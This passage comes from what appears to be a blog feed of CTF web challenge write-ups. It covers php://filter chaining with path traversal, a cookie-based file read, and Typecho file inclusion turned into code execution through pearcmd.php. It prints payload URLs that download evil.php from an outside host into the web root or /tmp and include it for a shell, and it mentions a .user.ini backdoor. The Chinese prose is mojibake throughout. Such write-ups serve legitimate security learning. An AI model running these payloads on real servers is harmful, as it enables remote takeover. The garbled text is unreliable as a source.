&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210420398.png" alt="image-20211024210420398">&lt;/p>
&lt;p>æ²¡æœ‰modeï¼Œæ­¤æ—¶&lt;/p>
&lt;pre tabindex="0">&lt;code>path=filter/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>357è¡Œæ‰§è¡Œstrdup()ï¼ŒæŠŠpathç¬¬6ä½ä¹‹åŽçš„å†…å®¹èµ‹ç»™pathdupæŒ‡é’ˆä¸Š&lt;/p>
&lt;pre tabindex="0">&lt;code>pathdup=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>358è¡Œstrstr()è¿”å›žpathdupçš„æŒ‡é’ˆä¸­/resource=å‡ºçŽ°çš„ä½ç½®ï¼Œåˆ°365è¡Œçš„åˆ¤æ–­&lt;/p>
&lt;pre tabindex="0">&lt;code>p+10=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>372è¡Œçš„php_strtok_r()å¯¹pathdup+1çš„ä½ç½®ä»¥'/&amp;lsquo;ä¸ºæ ‡å¿—è¿›è¡Œåˆ†å‰²&lt;/p>
&lt;pre tabindex="0">&lt;code>p=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°resource=ï¼Œè¿›373è¡Œçš„whileå¾ªçŽ¯ï¼Œå…ˆæ˜¯åˆ°378è¡Œçš„php_stream_apply_filter_list()ï¼Œè½¬è‡³159è¡Œ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024230730886.png" alt="image-20211024230730886">&lt;/p>
&lt;p>å°†pä½œä¸ºè¿‡æ»¤å™¨è¿›è¡Œæ³¨å†Œï¼Œ161è¡Œphp_stream_filter_append()åº”ç”¨åˆ°æ–‡ä»¶æµä¸Šï¼Œä½†æ˜¾ç„¶resourceä¸æ˜¯æµåŒ…è£…å™¨ï¼Œå¹²ä¸äº†äº‹ï¼Œé‚£å°±å†åˆ°whileå¾ªçŽ¯é‡ŒæŽ¥ç€å‘åŽæ‰¾ï¼Œç›´åˆ°å‘åŽç¢°åˆ°read&lt;/p>
&lt;pre tabindex="0">&lt;code>p=/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>è¿›å…¥374è¡Œï¼Œæ‰§è¡Œphp_stream_apply_filter_listä¹‹åŽå°±å˜æˆäº†&lt;/p>
&lt;pre tabindex="0">&lt;code>p=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>æ­¤æ—¶çš„p=convert.base64-decodeï¼Œå°±å¯ä»¥æ­£å¸¸çš„b64è§£ç æˆ‘ä»¬çš„å†…å®¹äº†&lt;/p>
&lt;h3 id="å†å›žå¤´çœ‹è¿™ä¸ªé¢˜">å†å›žå¤´çœ‹è¿™ä¸ªé¢˜&lt;/h3>
&lt;p>ä»£ç å¾ˆçŸ­ï¼Œé™åˆ¶åœ¨äºŽå†™å…¥çš„æ–‡ä»¶å†…å®¹è¢«b64åŠ å¯†&amp;amp;open_basedir&amp;amp;includeå·²ç»å†™å¥½çš„åŒ…è£…å™¨å’Œä¸€éƒ¨åˆ†å›ºå®šçš„å†…å®¹&lt;/p>
&lt;p>æˆ‘åˆšå¼€å§‹å¡åœ¨äº†å·²ç»å†™æ­»çš„åŒ…è£…å™¨çš„å¼€å¤´è¿˜æ€Žä¹ˆåŠ conver.base64-decodeï¼Ÿç„¶åŽå‘çŽ°æ˜¯æˆ‘æƒ³å¤šäº†ï¼Œå¯ä»¥æŽ¥ç€å¥—ï¼Œåº•å±‚åŽŸç†è§ä¸Šï¼Œä¼šå‘åŽå¾ªçŽ¯å–å€¼ç›´åˆ°ç¢°åˆ°ä¸€ä¸ªæ­£å¸¸çš„æµåŒ…è£…å™¨&lt;/p>
&lt;p>ç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯ç›®å½•ç©¿è¶Šäº†ï¼Œå‰é¢åŠ äº†5å±‚buffï¼Œä»Žç»“æžœå€’æŽ¨æ„Ÿè§‰å¯ä»¥ç†è§£ï¼Œä½†æ˜¯è‡ªå·±å´æ²¡è¯•å‡ºæ¥ï¼Œæˆ‘çš„é—®é¢˜&lt;/p>
&lt;p>æœ€åŽopen_basedirçš„ç»•è¿‡åè€Œæ˜¯æœ€è½»æ¾çš„ï¼Œèšå‰‘æ’ä»¶ç›´æŽ¥æž&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.laruence.com/2010/05/04/1450.html">æ·±å…¥ç†è§£PHPä¹‹require/includeé¡ºåº&lt;/a> | &lt;a href="https://www.cdxy.me/?p=752">Exploit with PHP Protocols / Wrappers&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨&lt;/a>&lt;/p>
&lt;h2 id="new_hospital">new_hospital&lt;/h2>
&lt;p>å“åº”cookieä¼šæœ‰ä¸ªAPI&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023225411779.png" alt="image-20211023225411779">&lt;/p>
&lt;p>å°†APIè®¾ä¸ºflag.php &lt;code>ZmxhZy5waHA%3d&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230544476.png" alt="image-20211023230544476">&lt;/p>
&lt;p>æ‰«ç›®å½• å¾—åˆ°/old/feature.php å°†è·¯å¾„æ”¹ä¸ºè¿™ä¸ª&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230842820.png" alt="image-20211023230842820">&lt;/p>
&lt;p>å°†APIæ”¹ä¸º../flag.php &lt;code>Li4vZmxhZy5waHA%3d&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230912588.png" alt="image-20211023230912588">&lt;/p>
&lt;p>â€”â€”â€”â€”å…¶å®žå¦‚æžœå…ˆæ‰«ç›®å½•æ‰«åˆ°/old/feature.phpçš„è¯ï¼Œå¯ä»¥å°†APIè®¾ä¸º./feature.php &lt;code>Li9mZWF0dXJlLnBocA%3d%3d&lt;/code> è¯»åˆ°è¿™ä¸€æ®µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023231112340.png" alt="image-20211023231112340">&lt;/p>
&lt;p>åŽç«¯çš„é€»è¾‘å°±æ˜¯å°†cookie[&amp;lsquo;api&amp;rsquo;]å–å‡ºï¼Œç›´æŽ¥è¯»å‡ºå†…å®¹&lt;/p>
&lt;p>æœ‰ä¸€ç‚¹ç‚¹è„‘æ´žï¼Œä¹Ÿè·Ÿçœ¼åŠ›è§æœ‰å…³ç³»ï¼Œæˆ‘ä¸€å¼€å§‹æ˜¯çœŸæ²¡æ³¨æ„åˆ°è¿™ä¸ªcookieçš„APIå­—æ®µï¼Œå±žå®žæ˜¯æœ‰ç‚¹å¤§ç—…ï¼›ä¹‹åŽåšé¢˜è¿˜æ˜¯è¦å¼€çŽ¯å¢ƒä¹‹åŽå°±è¿žburpï¼Œæ³¨æ„è§‚å¯Ÿå“åº”å¤´çš„ç‰¹æ®Šå­—æ®µ cookieçš„ç±»åž‹/ctrl+uçš„æºç /å¯èƒ½ä¼šæœ‰çš„æŽ§åˆ¶å°çš„æç¤ºä¿¡æ¯/robots.txtè¿™äº›ä¸œè¥¿ï¼Œä¸è¦é—æ¼ï¼Œä¸ç„¶å°±å¾ˆå¯æƒœäº†&lt;/p>
&lt;h2 id="give_me_you_0day">Give_me_you_0day&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023131341209.png" alt="image-20211023131341209">&lt;/p>
&lt;p>è¿™é‡Œè€ƒå¯Ÿçš„ç‚¹å¹¶ä¸æ˜¯Typecho 1.1/17.10.30ç‰ˆæœ¬çš„0dayï¼ˆç»™å‡ºçš„æºç å°±å®Œå…¨æ˜¯githubä¸Šçš„å‘è¡Œç‰ˆï¼‰ï¼Œè€Œæ˜¯install.phpä¸­ 608è¡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023233205364.png" alt="image-20211023233205364">&lt;/p>
&lt;p>åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶åŒ…å«çš„ç‚¹æ¥æžï¼Œpayloadå¯ä»¥ç›´æŽ¥å‚è€ƒ&lt;a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">[RCTF 2021] VerySafe&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030247104.png" alt="image-20211024030247104">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024025903697.png" alt="image-20211024025903697">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030018830.png" alt="image-20211024030018830">&lt;/p>
&lt;p>æ‰“çš„ç‚¹åœ¨äºŽpeclcmdï¼Œè¿™é‡Œæ¶‰åŠåˆ°çš„é¢˜å’ŒçŸ¥è¯†å®³æŒºå¤šï¼Œä¹‹å‰çœŸæ²¡è§è¿‡ï¼ˆdbqæ˜¯æˆ‘åšçš„é¢˜å¤ªå°‘å¤ªå°‘äº†ï¼‰ï¼Œåœ¨è¿™é‡Œä¸€å¹¶å­¦ä¹ äº†&lt;/p>
&lt;h3 id="å…³äºŽregister_argc_argvé…ç½®é¡¹">å…³äºŽ&lt;code>register_argc_argv&lt;/code>é…ç½®é¡¹&lt;/h3>
&lt;p>æ˜¯php.iniæ ¸å¿ƒé…ç½®ä¸­çš„ä¸€ä¸ªé€‰é¡¹ï¼Œé»˜è®¤æ˜¯è¿™æ ·&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024002824679.png" alt="image-20211024002824679">&lt;/p>
&lt;p>&lt;a href="https://www.php.net/manual/zh/ini.core.php#ini.register-argc-argv">æ‰‹å†Œ&lt;/a>æ˜¯è¿™æ ·å†™çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000219559.png" alt="image-20211024000219559">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000145606.png" alt="image-20211024000145606">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000543235.png" alt="image-20211024000543235">&lt;/p>
&lt;p>ä»Žphp=4.0.0åŽä¸ºå¯è®¾ç½®çš„é€‰é¡¹ï¼ˆæ­¤å‰æ€»ä¸ºOnï¼‰é»˜è®¤ä¸ºå¼€å¯çŠ¶æ€ï¼Œå½“php&amp;lt;=4.2.3æ—¶å¯ä¿®æ”¹èŒƒå›´æ˜¯&lt;code>PHP_INI_ALL&lt;/code>ï¼Œæ›´è¯¦ç»†çš„å†…å®¹å¯ä»¥å‚è§-&amp;gt;&lt;a href="http://ms7.fhsh.tp.edu.tw/php5c/features.commandline.html">PHPçš„å‘½ä»¤è¡Œæ¨¡å¼&lt;/a>&lt;/p>
&lt;p>åœ¨&lt;code>register_argc_argv&lt;/code>å¼€å¯çš„æƒ…å†µä¸‹ï¼Œcgiå’Œcliæ¨¡å¼ä¸‹éƒ½å¯ä»¥ç›´æŽ¥è®¿é—®åˆ°ä¼ å…¥çš„å‚æ•°ï¼›å…¶ä¸­argcæ˜¯ä¼ é€’è¿‡åŽ»çš„å‚æ•°çš„ä¸ªæ•°ï¼Œargvæ˜¯åŒ…å«æœ‰å®žé™…å‚æ•°çš„æ•°ç»„ï¼›cliæ¨¡å¼æµ‹è¯•å¦‚ä¸‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#75715e">// var_dump($HTTP_SERVER_VARS[&amp;#39;argv&amp;#39;]);
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003201497.png" alt="image-20211024003201497">&lt;/p>
&lt;p>cgiçš„è¯ï¼Œç›´æŽ¥ç”¨ä¸Šé¢çš„&lt;code>$_SERVER['argv']&lt;/code>æ˜¯ä¸ä¼šèŽ·å–åˆ°å€¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003801051.png" alt="image-20211024003801051">&lt;/p>
&lt;p>ç›´æŽ¥æŸ¥çœ‹$_SERVERè¿™ä¸ªå¤§æ•°ç»„ï¼Œå¯ä»¥å‘çŽ°æˆ‘ä»¬çš„å‚æ•°åœ¨è¿™é‡Œæ˜¯ä»¥ä¸€æ•´ä¸ªQUERY_STRINGçš„å½¢å¼å‡ºçŽ°çš„ï¼ˆè¯¦ç»†çš„æ•°ç»„è§£æž-&amp;gt;&lt;a href="https://www.feiniaomy.com/post/274.html">PHPè¶…å…¨å±€å˜é‡$_SERVERçš„ç”¨æ³•&lt;/a>ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024012150841.png" alt="image-20211024012150841">&lt;/p>
&lt;p>æœ‰ä¸ªç‰¹æ®Šçš„trickåœ¨äºŽï¼Œå¦‚æžœæ˜¯&lt;/p>
&lt;pre tabindex="0">&lt;code>/test.php?a=1&amp;amp;b=1
&lt;/code>&lt;/pre>&lt;p>ç¡®å®žæ˜¯ä¸¤ä¸ªå‚æ•°ï¼Œä½†è¿”å›žçš„$_SERVER[&amp;lsquo;argv&amp;rsquo;]ä¸º1ï¼Œå¦‚æžœæ˜¯&lt;/p>
&lt;pre tabindex="0">&lt;code>/test.php?a=1+b=1
&lt;/code>&lt;/pre>&lt;p>åˆ™ä¼šè¢«æˆªæ–­ï¼Œè¿”å›ž$_SERVER[&amp;lsquo;argv&amp;rsquo;]åˆ™ä¸º2ï¼ˆè¯´å®žè¯æˆ‘æœ¬åœ°çœŸæ²¡è·‘å‡ºæ¥è¿™ä¸ª å¯èƒ½æ˜¯å“ªé‡Œçš„é…ç½®æœ‰é—®é¢˜ï¼Ÿä½†æ˜¯çœ‹äº†å¾ˆå¤šèµ„æ–™ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å¯ä»¥è¢«å¤çŽ°æˆåŠŸçš„â€¦â€¦â€¦â€¦â€¦â€¦emmmm æœ‰ä¸€ç‚¹ç‚¹ç¦»è°±ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020719209.png" alt="image-20211024020719209">&lt;/p>
&lt;h3 id="å…³äºŽpearå‘½ä»¤">å…³äºŽ&lt;code>pear&lt;/code>å‘½ä»¤&lt;/h3>
&lt;p>pearæ˜¯&lt;em>the PHP Extention and Application Repository&lt;/em>çš„ç¼©å†™ï¼Œæ˜¯ä¸€ä¸ªPHPæ‰©å±•ä¸Žåº”ç”¨çš„ä»£ç ä»“åº“ï¼Œpearä»“åº“ä»£ç ä»¥åŒ…&lt;em>package&lt;/em>åˆ†åŒºï¼Œæ¯ä¸€ä¸ª&lt;em>pear package&lt;/em>éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®ï¼Œæœ‰è‡ªå·±ç‹¬ç«‹çš„å¼€å‘å›¢é˜Ÿã€ç‰ˆæœ¬æŽ§åˆ¶ã€æ–‡æ¡£å’Œå…¶ä»–åŒ…çš„ä¾èµ–å…³ç³»ä¿¡æ¯ï¼›&lt;em>pear package&lt;/em>ä»¥phar, tar, zipå½¢å¼å‘å¸ƒï¼Œé€šè¿‡&lt;code>apt install php-pear&lt;/code>æ¥å®‰è£…&lt;/p>
&lt;p>pearå‘½ä»¤çš„å®žçŽ°æ˜¯ä¸€ä¸ªshè„šæœ¬&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/sh
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e"># first find which PHP binary to use&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&lt;/span>&lt;span style="color:#111">$PHP_PEAR_PHP_BIN&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">$PHP_PEAR_PHP_BIN&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/local/bin/php&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>php_bin&lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>php
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/bin/php&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#75715e"># then look for the right pear include dir&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;-d include_path=&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>php_dir&lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">`&lt;/span>dirname &lt;span style="color:#111">$0&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php&amp;#34;&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;-d include_path=/usr/local/lib/php&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#111">exec&lt;/span> &lt;span style="color:#111">$PHP&lt;/span> -C -q &lt;span style="color:#111">$INCARG&lt;/span> -d data.timezone&lt;span style="color:#f92672">=&lt;/span>UTC -d &lt;span style="color:#111">output_buffering&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> -d &lt;span style="color:#111">variables_order&lt;/span>&lt;span style="color:#f92672">=&lt;/span>EGPCS -d &lt;span style="color:#111">open_basedir&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> -d &lt;span style="color:#111">safe_mode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> -d &lt;span style="color:#111">register_argc_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On&amp;#34;&lt;/span> -d &lt;span style="color:#111">auto_prepend_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> -d &lt;span style="color:#111">auto_append_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">$INCDIR&lt;/span>/pearcmd.php &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">$@&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»Žæœ€åŽä¸€è¡Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†/pearcmd.phpï¼Œè€Œè¿™ä¸ªpearcmd.phpçš„å‚æ•°$argvå°±æ¥æºäºŽ$_SERVER[&amp;lsquo;argv&amp;rsquo;]ï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬å¯æŽ§çš„ä¼ å…¥å‚æ•°&lt;/p>
&lt;h3 id="åˆ©ç”¨pearå‘½ä»¤æ‰§è¡Œä»»æ„æ–‡ä»¶ä¸‹è½½">åˆ©ç”¨&lt;code>pear&lt;/code>å‘½ä»¤æ‰§è¡Œä»»æ„æ–‡ä»¶ä¸‹è½½&lt;/h3>
&lt;p>å¦‚å›¾ï¼Œç›´æŽ¥ä¸‹è½½å¼€å¯äº†httpæœåŠ¡å™¨çš„ç›®å½•ä¸‹çš„æŒ‡å®šæ–‡ä»¶åˆ°å½“å‰æ‰€åœ¨ç›®å½•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020030648.png" alt="image-20211024020030648">&lt;/p>
&lt;p>ä½¿ç”¨&lt;code>install -R&lt;/code>è€Œéž&lt;code>download&lt;/code>å¯ä»¥æŽ§åˆ¶ä¸‹è½½åˆ°ä»»æ„ç›®å½•ï¼Œæ¯”å¦‚ç›´æŽ¥ä¸‹è½½åˆ°webæœåŠ¡çš„ç›®å½•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020411477.png" alt="image-20211024020411477">&lt;/p>
&lt;h3 id="æ‰€ä»¥æ€»ä½“æ€è·¯payload">æ‰€ä»¥æ€»ä½“æ€è·¯+payload&lt;/h3>
&lt;p>å¦‚æžœå­˜åœ¨è¿™æ ·çš„çŽ¯å¢ƒ&lt;/p>
&lt;ul>
&lt;li>å®‰è£…pear&lt;/li>
&lt;li>å¼€å¯register_argc_argv&lt;/li>
&lt;li>å­˜åœ¨å¯æŽ§çš„ä¼ å…¥å‚æ•°æ¥åšåˆ°æ–‡ä»¶åŒ…å«ï¼ˆæ¯”å¦‚&lt;code>include $_GET['f'].php&lt;/code>ï¼‰&lt;/li>
&lt;li>å¯ä»¥å‡ºç½‘&lt;/li>
&lt;/ul>
&lt;p>æˆ‘ä»¬å°±å¯ä»¥åšåˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½ä»Žè€Œgetshellï¼›å‰é¢ä¹Ÿæåˆ°register_argc_argvç»§ç»­PHP_IN_PREDIRï¼Œæˆ‘ä»¬å¯ä»¥ç•™ä¸€ä¸ª.user.iniçš„åŽé—¨æ¥è®¾ç½®register_argc_agrvä¸ºOn&lt;/p>
&lt;p>&lt;strong>payload&lt;/strong>å°±æ˜¯è¿™æ ·äº†&lt;/p>
&lt;pre tabindex="0">&lt;code>// å­˜åœ¨ include $_GET['f'].php
// webç›®å½•å¯å†™
- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;+install+-R+/var/www/html+http://ip:port/evil.php
- http://ip:port/tmp/pear/download/evil.php
// tmpç›®å½•å¯å†™
- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;+install+-R+/tmp+http://ip:port/evil.php
- http://ip:port/include.php?f=/tmp/pear/download/evil
&lt;/code>&lt;/pre>&lt;p>é¦–å…ˆè¦åŒ…å«ä¸€ä¸ªæ­£ç¡®ä½ç½®çš„pearcmd.phpï¼ˆé€šå¸¸åœ¨/usr/local/lib/php/pearcmd.phpï¼‰ï¼ŒæŽ¥ç€åŒ…å«&amp;amp;+download+http://your_vps/eval.phpï¼ˆæˆ–è€…å¦‚æžœå‰é¢ç›´æŽ¥æ˜¯/pearcmd.phpçš„è¯å°±å¯ä»¥ç›´æŽ¥ç»™å‚æ•°äº†/pearcmd.php+download+http://your_vps/eval.phpï¼‰æ¥è£…ðŸŽï¼ˆæ³¨æ„è·¯å¾„æ˜¯å¦æ­£ç¡®ï¼‰ï¼Œä¹‹åŽå†åŒ…å«æˆ‘ä»¬çš„ðŸŽå³å¯&lt;/p>
&lt;h3 id="å…¶å®ƒçš„ä¾‹é¢˜">å…¶å®ƒçš„ä¾‹é¢˜&lt;/h3>
&lt;p>&lt;a href="https://web.archive.org/web/20201022203937/https://khack40.info/camp-ctf-2015-trolol-web-write-up/">[CampCTF 2015] Trolol&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.lemonprefect.cn/zh-tw/posts/9b2fbf24#MeowWorld">[å·…å³°æžå®¢ 2020] MeowWord&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">[RCTF 2021] VerySafe&lt;/a>&lt;/p>
&lt;hr>
&lt;p>è¿˜æ˜¯åšçš„é¢˜ä¸å¤Ÿå¤šï¼Œå·²æœ‰çš„çŸ¥è¯†ä¹Ÿåº”ç”¨çš„ä¸å¤Ÿç†Ÿç»ƒï¼Œå®žåœ¨æ˜¯å¤ªå¤ªå¤ªå¤ªå¤ªèœäº†ï¼Œå¾—å¥½å¥½å­¦ï¼Œä¸èƒ½å¤©å¤©åˆ’æ°´æ‘¸é±¼&lt;/p></description></item><item><title>DasCTF1021 Wp</title><link>https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/</link><pubDate>Sun, 24 Oct 2021 16:47:40 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/</guid><description>&lt;h2 id="webè¿·è·¯çš„é­”æ³•å°‘å¥³">Web/è¿·è·¯çš„é­”æ³•å°‘å¥³&lt;/h2>
&lt;blockquote>
&lt;p>é­”æ³•å°‘å¥³è¿·å¤±åœ¨äº†ä»£ç ç©ºé—´ è¯·å¯»æ‰¾å¥¹çŽ°åœ¨åœ¨å“ª&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
